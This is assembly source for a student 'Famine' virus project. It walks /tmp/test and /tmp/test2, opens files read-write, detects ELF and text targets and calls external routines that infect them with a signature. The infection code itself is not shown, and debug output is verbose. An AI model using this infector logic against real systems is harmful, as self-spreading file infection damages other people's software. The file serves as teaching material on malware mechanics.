; **************************************************************************** ;
;                                                                              ;
;    famine.asm                                           :::      ::::::::    ;
;                                                       :+:      :+:    :+:    ;
;    By: sdestann <sdestann@student.42perpignan.    +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2025/10/13 14:07:12 by sdestann          #+#    #+#              ;
;    Updated: 2025/10/23 00:00:00 by sdestann         ###   ########.fr        ;
; **************************************************************************** ;

BITS 64

%include "include/macros.inc"
%include "include/structures.inc"

global _start
global current_file
global signature
global sig_len

section .data
    ; Signature à injecter dans les binaires
    signature: db "Famine version 1.0 (c)oded by vfuster- and sdestann", 0
    signature_end:
    sig_len: dq signature_end - signature  ; Longueur réelle (texte + nul final)
    
    ; Chemins des répertoires cibles
    path_test1: db "/tmp/test", 0
    path_test1_len: equ $ - path_test1
    
    path_test2: db "/tmp/test2", 0
    path_test2_len: equ $ - path_test2
    
    ; Messages de debug
    debug_nonelf_msg: db "[DEBUG] Fichier non-ELF détecté", 10
    debug_nonelf_msg_len: equ $ - debug_nonelf_msg
    
    debug_text_type_msg: db "[DEBUG] Type de fichier détecté: ", 0
    debug_text_type_msg_len: equ $ - debug_text_type_msg
    
    debug_text_infected_msg: db "[DEBUG] Fichier texte déjà infecté", 10
    debug_text_infected_msg_len: equ $ - debug_text_infected_msg
    
    debug_text_infect_msg: db "[DEBUG] Infection du fichier texte", 10
    debug_text_infect_msg_len: equ $ - debug_text_infect_msg
    
    debug_filepath_msg: db "[DEBUG] Chemin construit: ", 0
    debug_filepath_msg_len: equ $ - debug_filepath_msg
    
    debug_text_start_msg: db "[DEBUG] process_text_file: début", 10
    debug_text_start_msg_len: equ $ - debug_text_start_msg
    
    debug_filename_extracted_msg: db "[DEBUG] Nom de fichier extrait: ", 0
    debug_filename_extracted_msg_len: equ $ - debug_filename_extracted_msg
    
    debug_type_detected_msg: db "[DEBUG] Type détecté: ", 0
    debug_type_detected_msg_len: equ $ - debug_type_detected_msg
    
    debug_type_unknown_msg: db "[DEBUG] Type inconnu", 10
    debug_type_unknown_msg_len: equ $ - debug_type_unknown_msg
    
    debug_infecting_msg: db "[DEBUG] Infection en cours...", 10
    debug_infecting_msg_len: equ $ - debug_infecting_msg
    
    debug_infection_success_msg: db "[DEBUG] Infection réussie!", 10
    debug_infection_success_msg_len: equ $ - debug_infection_success_msg
    
    debug_already_infected_msg: db "[DEBUG] Fichier déjà infecté", 10
    debug_already_infected_msg_len: equ $ - debug_already_infected_msg
    
    debug_infection_failed_msg: db "[DEBUG] Échec de l'infection", 10
    debug_infection_failed_msg_len: equ $ - debug_infection_failed_msg
    
    debug_extract_input_msg: db "[DEBUG] extract_filename input: ", 0
    debug_extract_input_msg_len: equ $ - debug_extract_input_msg
    
    debug_extract_result_msg: db "[DEBUG] extract_filename result: ", 0
    debug_extract_result_msg_len: equ $ - debug_extract_result_msg
    
    debug_extract_final_msg: db "[DEBUG] extract_filename final: ", 0
    debug_extract_final_msg_len: equ $ - debug_extract_final_msg
    
    debug_before_infect_msg: db "[DEBUG] Avant infect_text_file", 10
    debug_before_infect_msg_len: equ $ - debug_before_infect_msg
    
    debug_after_infect_msg: db "[DEBUG] Après infect_text_file, résultat: ", 0
    debug_after_infect_msg_len: equ $ - debug_after_infect_msg
    
    debug_slash_found_msg: db "[DEBUG] '/' trouvé!", 10
    debug_slash_found_msg_len: equ $ - debug_slash_found_msg
    
    debug_position_calculated_msg: db "[DEBUG] Position calculée", 10
    debug_position_calculated_msg_len: equ $ - debug_position_calculated_msg
    
    newline: db 10
    
    ; Buffer temporaire pour afficher un caractère
    temp_char_buffer: db 0

section .bss
    ; Buffer pour getdents64
    dirent_buffer: resb 4096
    
    ; Buffer pour stocker un nom de fichier complet
    filepath_buffer: resb 512
    
    ; Structure file_info pour le fichier courant
    current_file: resb file_info_size

section .text

; =============================================================================
; _start: Point d'entrée du programme
; Params: aucun
; Returns: exit code 0 (toujours)
; Side effects: modifie les binaires dans /tmp/test et /tmp/test2
; =============================================================================
_start:
    ; Sauvegarder les registres callee-saved
    PUSH_CALLEE_SAVE
    
    ; Vérifier les conditions d'activation
    call should_activate
    test rax, rax
    jz .exit  ; Pas d'activation
    
    ; Traiter /tmp/test
    mov rdi, path_test1
    call process_directory
    
    ; Traiter /tmp/test2
    mov rdi, path_test2
    call process_directory
    
.exit:
    ; Restaurer les registres
    POP_CALLEE_SAVE
    
    ; Sortie silencieuse avec code 0
    xor rdi, rdi
    mov rax, SYS_EXIT
    syscall

; =============================================================================
; process_directory: Traite tous les binaires d'un répertoire
; Params: rdi = pointeur vers le chemin du répertoire (null-terminated)
; Returns: rien
; Side effects: infecte les binaires ELF64 non infectés
; =============================================================================
process_directory:
    push rbp
    mov rbp, rsp
    sub rsp, 16
    
    ; Sauvegarder le chemin
    mov [rbp-8], rdi
    
    ; Ouvrir le répertoire
    ; open(path, O_RDONLY)
    mov rsi, O_RDONLY
    mov rax, SYS_OPEN
    syscall
    
    ; Vérifier l'erreur
    cmp rax, 0
    jl .error
    
    ; Sauvegarder le fd
    mov [rbp-16], rax
    
.read_loop:
    ; getdents64(fd, buffer, 4096)
    mov rdi, [rbp-16]           ; fd
    mov rsi, dirent_buffer      ; buffer
    mov rdx, 4096               ; count
    mov rax, SYS_GETDENTS64
    syscall
    
    ; Si rax <= 0, on a fini
    test rax, rax
    jle .close_dir
    
    ; Sauvegarder le nombre d'octets lus
    mov r12, rax
    xor r13, r13                ; Offset dans le buffer
    
.process_entries:
    ; Vérifier si on a traité tous les entries
    cmp r13, r12
    jge .read_loop
    
    ; Pointer sur l'entry courante
    lea rbx, [dirent_buffer + r13]
    
    ; Vérifier le type de fichier (d_type)
    movzx rax, byte [rbx + linux_dirent64.d_type]
    cmp rax, DT_REG
    jne .next_entry
    
    ; Construire le chemin complet
    ; rdi = chemin du répertoire, rsi = nom du fichier
    mov rdi, [rbp-8]            ; Chemin du répertoire
    lea rsi, [rbx + linux_dirent64.d_name]
    
    ; Sauvegarder les registres avant l'appel
    push r12
    push r13
    push rbx
    
    call build_filepath
    
    ; Restaurer les registres
    pop rbx
    pop r13
    pop r12
    
    ; Traiter le fichier
    mov rdi, filepath_buffer
    
    ; Sauvegarder les registres avant l'appel
    push r12
    push r13
    push rbx
    
    call process_file
    
    ; Restaurer les registres
    pop rbx
    pop r13
    pop r12
    
.next_entry:
    ; Avancer au prochain entry
    movzx rax, word [rbx + linux_dirent64.d_reclen]
    add r13, rax
    jmp .process_entries
    
.close_dir:
    ; Fermer le répertoire
    mov rdi, [rbp-16]
    mov rax, SYS_CLOSE
    syscall
    
.error:
    leave
    ret

; =============================================================================
; build_filepath: Construit le chemin complet d'un fichier
; Params: rdi = chemin du répertoire (null-terminated)
;         rsi = nom du fichier (null-terminated)
; Returns: filepath_buffer contient le chemin complet
; Side effects: modifie filepath_buffer
; =============================================================================
build_filepath:
    push rbp
    mov rbp, rsp
    push rsi
    push rdi
    
    ; Destination
    mov rax, filepath_buffer
    
    ; Copier le chemin du répertoire
.copy_dir_loop:
    mov cl, byte [rdi]
    test cl, cl
    jz .dir_done
    mov byte [rax], cl
    inc rdi
    inc rax
    jmp .copy_dir_loop
    
.dir_done:
    ; Ajouter '/'
    mov byte [rax], '/'
    inc rax
    
    ; Récupérer le pointeur vers le nom du fichier
    pop rdi                     ; Jeter l'ancien rdi
    pop rsi                     ; Récupérer rsi (nom du fichier)
    
    ; Copier le nom du fichier
.copy_file_loop:
    mov cl, byte [rsi]
    mov byte [rax], cl
    test cl, cl
    jz .done
    inc rsi
    inc rax
    jmp .copy_file_loop
    
.done:
    pop rbp
    ret

; =============================================================================
; process_file: Traite un fichier binaire
; Params: rdi = pointeur vers le chemin du fichier
; Returns: rien
; Side effects: infecte le fichier s'il est éligible
; =============================================================================
process_file:
    push rbp
    mov rbp, rsp
    sub rsp, 32
    
    ; Sauvegarder le chemin
    mov [rbp-8], rdi
    
    ; Ouvrir le fichier (rdi contient déjà le chemin)
    mov rsi, O_RDWR  ; O_RDWR pour pouvoir écrire
    mov rax, SYS_OPEN
    syscall
    
    ; Vérifier l'erreur d'ouverture
    cmp rax, 0
    jl .error
    
    ; Sauvegarder le fd dans current_file
    mov [current_file + file_info.fd], eax
    
    ; Obtenir la taille du fichier avec lseek
    mov rdi, rax
    xor rsi, rsi
    mov rdx, 2  ; SEEK_END
    mov rax, SYS_LSEEK
    syscall
    
    ; Sauvegarder la taille
    mov [current_file + file_info.size], rax
    
    ; Remettre le curseur au début
    movsxd rdi, dword [current_file + file_info.fd]
    xor rsi, rsi
    mov rdx, 0  ; SEEK_SET
    mov rax, SYS_LSEEK
    syscall
    
    ; Mapper le fichier en mémoire
    call map_file
    test rax, rax
    jz .error
    
    ; Sauvegarder l'adresse de la map
    mov [rbp-16], rax
    
    ; Vérifier si c'est un ELF64
    call check_elf64
    cmp rax, 1
    je .check_infected_64
    
    ; Vérifier si c'est un ELF32
    call check_elf32
    cmp rax, 1
    je .check_infected_32
    
    ; Si ce n'est pas un ELF, tester si c'est un fichier texte supporté
    ; DEBUG: Log fichier non-ELF
    mov rdi, 1  ; stdout
    mov rsi, debug_nonelf_msg
    mov rdx, debug_nonelf_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; Unmapper le fichier AVANT de traiter les fichiers texte
    ; car infect_text_file utilise write() et non le mapping
    call unmap_file
    
    ; Fermer le fichier actuel et le rouvrir en mode écriture pour les fichiers texte
    movsxd rdi, dword [current_file + file_info.fd]
    mov rax, SYS_CLOSE
    syscall
    
    ; Rouvrir le fichier en mode écriture
    mov rdi, [rbp-8]  ; Chemin du fichier
    mov rsi, O_RDWR
    mov rax, SYS_OPEN
    syscall
    
    ; Vérifier l'erreur
    cmp rax, 0
    jl .close_file
    
    ; Sauvegarder le nouveau fd
    mov [current_file + file_info.fd], eax
    
    ; Traiter le fichier texte
    call process_text_file
    jmp .close_file  ; Pas besoin de unmapper à nouveau
    
.check_infected_32:
    
    ; Vérifier si déjà infecté (ELF32)
    call check_infected
    test rax, rax
    jnz .unmap_file
    
    ; Infecter le fichier ELF32
    call infect_elf32
    jmp .unmap_file
    
.check_infected_64:
    ; Vérifier si déjà infecté (ELF64)
    call check_infected
    test rax, rax
    jnz .unmap_file
    
    ; Infecter le fichier ELF64
    call infect_binary
    
.unmap_file:
    call unmap_file
    
.close_file:
    movsxd rdi, dword [current_file + file_info.fd]
    mov rax, SYS_CLOSE
    syscall
    
.error:
    leave
    ret

; =============================================================================
; process_text_file: Traite un fichier texte pour l'infection
; Params: aucun (utilise current_file et filepath_buffer)
; Returns: rien
; Side effects: infecte le fichier texte s'il est éligible
; =============================================================================
process_text_file:
    push rbp
    mov rbp, rsp
    
    ; DEBUG: Log du début de process_text_file
    mov rdi, 1  ; stdout
    mov rsi, debug_text_start_msg
    mov rdx, debug_text_start_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; Extraire le nom de fichier du chemin complet
    mov rdi, filepath_buffer
    call extract_filename
    push rax  ; SAUVEGARDER LE POINTEUR VERS LE NOM DE FICHIER
    
    ; DEBUG: Log du nom de fichier extrait
    mov rdi, 1
    mov rsi, debug_filename_extracted_msg
    mov rdx, debug_filename_extracted_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; Afficher le nom de fichier
    pop rax   ; RESTAURER LE POINTEUR
    push rax  ; SAUVEGARDER À NOUVEAU
    mov rdi, 1
    mov rsi, rax
    mov rdx, 50  ; Longueur max
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    ; Détecter le type de fichier basé sur l'extension
    pop rax   ; RESTAURER LE POINTEUR
    push rax  ; SAUVEGARDER À NOUVEAU
    mov rdi, rax  ; rax contient le pointeur vers le nom de fichier
    call detect_file_type
    pop rbx   ; NETTOYER LA PILE (on n'a plus besoin du pointeur)
    test rax, rax
    jz .type_unknown  ; Type non supporté
    
    ; Sauvegarder le type AVANT tout syscall
    mov rbx, rax                      ; Sauvegarder le type dans rbx
    
    ; DEBUG: Log du type détecté
    mov rdi, 1
    mov rsi, debug_type_detected_msg
    mov rdx, debug_type_detected_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; Afficher le type (convertir en caractère)
    mov rax, rbx                      ; Récupérer le type
    add rax, '0'                      ; Convertir en ASCII
    mov byte [temp_char_buffer], al   ; Stocker dans le buffer
    mov rdi, 1
    mov rsi, temp_char_buffer         ; Pointer vers le buffer
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    ; Restaurer le type dans rax pour la suite
    mov rax, rbx
    
    ; DEBUG: Log avant check_text_infected
    mov rdi, 1
    mov rsi, debug_before_infect_msg
    mov rdx, debug_before_infect_msg_len
    push rax  ; SAUVEGARDER LE TYPE
    mov rax, SYS_WRITE
    syscall
    pop rax   ; RESTAURER LE TYPE
    
    ; Vérifier si déjà infecté
    call check_text_infected
    
    ; DEBUG: Log après check_text_infected
    push rax
    mov rdi, 1
    mov rsi, debug_after_infect_msg
    mov rdx, debug_after_infect_msg_len
    mov rax, SYS_WRITE
    syscall
    
    pop rax
    push rax  ; Sauvegarder à nouveau
    add rax, '0'
    mov byte [temp_char_buffer], al
    mov rdi, 1
    mov rsi, temp_char_buffer
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    pop rax  ; Restaurer le résultat
    test rax, rax
    jnz .already_infected  ; Déjà infecté
    
    ; RESTAURER LE TYPE POUR infect_text_file
    mov rax, rbx
    
    ; DEBUG: Log de l'infection
    mov rdi, 1
    mov rsi, debug_infecting_msg
    mov rdx, debug_infecting_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; DEBUG: Log avant appel infect_text_file
    mov rdi, 1
    mov rsi, debug_before_infect_msg
    mov rdx, debug_before_infect_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; DEBUG: Log du fd avant infect_text_file
    movsxd rdi, dword [current_file + file_info.fd]
    push rdi
    mov rdi, 1
    mov rsi, debug_infecting_msg
    mov rdx, debug_infecting_msg_len
    mov rax, SYS_WRITE
    syscall
    
    pop rdi
    push rdi
    add rdi, '0'
    mov byte [temp_char_buffer], dil
    mov rdi, 1
    mov rsi, temp_char_buffer
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    pop rdi
    
    ; DEBUG: Test lseek avant infect_text_file
    movsxd rdi, dword [current_file + file_info.fd]
    xor rsi, rsi
    mov rdx, 0  ; SEEK_SET
    mov rax, SYS_LSEEK
    syscall
    
    ; Vérifier l'erreur
    cmp rax, 0
    jl .lseek_error
    
    ; DEBUG: Log succès lseek
    mov rdi, 1
    mov rsi, debug_infection_success_msg
    mov rdx, debug_infection_success_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; Infecter le fichier texte
    movsxd rdi, dword [current_file + file_info.fd]  ; Passer le fd en paramètre
    mov rax, rbx  ; RESTAURER LE TYPE dans rax
    call infect_text_file
    jmp .continue
    
.lseek_error:
    ; DEBUG: Log erreur lseek
    mov rdi, 1
    mov rsi, debug_infection_success_msg
    mov rdx, debug_infection_success_msg_len
    mov rax, SYS_WRITE
    syscall
    jmp .continue
    
.continue:
    
    ; DEBUG: Log après appel infect_text_file
    push rax  ; Sauvegarder le résultat
    mov rdi, 1
    mov rsi, debug_after_infect_msg
    mov rdx, debug_after_infect_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; Afficher le code de retour
    pop rax   ; Restaurer le résultat
    push rax  ; Sauvegarder à nouveau
    add rax, '0'  ; Convertir en ASCII
    mov byte [temp_char_buffer], al
    mov rdi, 1
    mov rsi, temp_char_buffer
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    pop rax   ; Restaurer le résultat final
    test rax, rax
    jz .infection_failed  ; Échec de l'infection
    
    ; DEBUG: Log succès
    mov rdi, 1
    mov rsi, debug_infection_success_msg
    mov rdx, debug_infection_success_msg_len
    mov rax, SYS_WRITE
    syscall
    jmp .done
    
.type_unknown:
    ; DEBUG: Log type inconnu
    mov rdi, 1
    mov rsi, debug_type_unknown_msg
    mov rdx, debug_type_unknown_msg_len
    mov rax, SYS_WRITE
    syscall
    jmp .done
    
.already_infected:
    ; DEBUG: Log déjà infecté
    mov rdi, 1
    mov rsi, debug_already_infected_msg
    mov rdx, debug_already_infected_msg_len
    mov rax, SYS_WRITE
    syscall
    jmp .done
    
.infection_failed:
    ; DEBUG: Log échec infection
    mov rdi, 1
    mov rsi, debug_infection_failed_msg
    mov rdx, debug_infection_failed_msg_len
    mov rax, SYS_WRITE
    syscall
    
.done:
    leave
    ret

; =============================================================================
; extract_filename: Extrait le nom de fichier d'un chemin complet
; Params: rdi = pointeur vers le chemin complet
; Returns: rax = pointeur vers le nom de fichier
; Side effects: aucun
; =============================================================================
extract_filename:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    
    mov rbx, rdi  ; Initialiser rbx d'abord
    
    ; DEBUG: Log du chemin d'entrée
    mov rdi, 1
    mov rsi, debug_extract_input_msg
    mov rdx, debug_extract_input_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, rbx
    mov rdx, 50
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    xor r12, r12  ; Dernière position de '/' (utiliser r12 au lieu de rax)
    
    ; Trouver le dernier '/' - approche simplifiée
.loop:
    mov cl, byte [rbx]
    test cl, cl
    jz .done
    cmp cl, '/'
    jne .next
    mov r12, rbx  ; Sauvegarder la position du '/'
    ; DEBUG: Log de la position trouvée
    mov rdi, 1
    mov rsi, debug_slash_found_msg
    mov rdx, debug_slash_found_msg_len
    mov rax, SYS_WRITE
    syscall
.next:
    inc rbx
    jmp .loop
    
.done:
    ; DEBUG: Log du résultat
    mov rdi, 1
    mov rsi, debug_extract_result_msg
    mov rdx, debug_extract_result_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; Si on a trouvé un '/', avancer d'un caractère
    test r12, r12
    jz .no_slash
    mov rax, r12
    inc rax  ; Avancer après le '/'
    ; DEBUG: Log de la position calculée
    push rax  ; SAUVEGARDER LE RÉSULTAT AVANT L'APPEL SYSTÈME
    mov rdi, 1
    mov rsi, debug_position_calculated_msg
    mov rdx, debug_position_calculated_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rax   ; RESTAURER LE RÉSULTAT
    jmp .return
    
.no_slash:
    ; Pas de '/', retourner le début
    mov rax, rdi
    
.return:
    ; DEBUG: Log du résultat final
    push rax  ; Sauvegarder le résultat
    mov rdi, 1
    mov rsi, debug_extract_final_msg
    mov rdx, debug_extract_final_msg_len
    mov rax, SYS_WRITE
    syscall
    
    pop rax   ; Restaurer le résultat
    push rax ; Sauvegarder à nouveau
    mov rdi, 1
    mov rsi, rax
    mov rdx, 50
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    pop rax   ; Restaurer le résultat final
    
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; Les fonctions suivantes sont implémentées dans d'autres fichiers :
; - map_file (src/file_ops.asm)
; - unmap_file (src/file_ops.asm)
; - check_elf64 (src/elf_check.asm)
; - check_infected (src/elf_check.asm)
; - infect_binary (src/infect.asm)
; =============================================================================

extern should_activate
extern map_file
extern unmap_file
extern check_elf64
extern check_elf32
extern check_infected
extern infect_binary
extern infect_elf32
extern detect_file_type
extern check_text_infected
extern infect_text_file